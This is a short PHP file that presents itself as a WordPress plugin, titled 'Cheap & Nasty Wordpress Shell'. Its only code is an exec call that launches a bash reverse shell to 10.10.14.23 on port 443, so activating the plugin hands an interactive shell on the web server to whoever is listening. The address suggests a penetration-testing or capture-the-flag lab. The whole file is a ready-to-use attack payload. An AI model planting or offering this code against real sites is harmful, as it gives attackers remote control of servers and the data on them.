<?php
/*
Plugin Name: Cheap & Nasty Wordpress Shell
Author: Leon Jacobs
*/

exec("/bin/bash -c 'bash -i >& /dev/tcp/10.10.14.23/443 0>&1'")

?>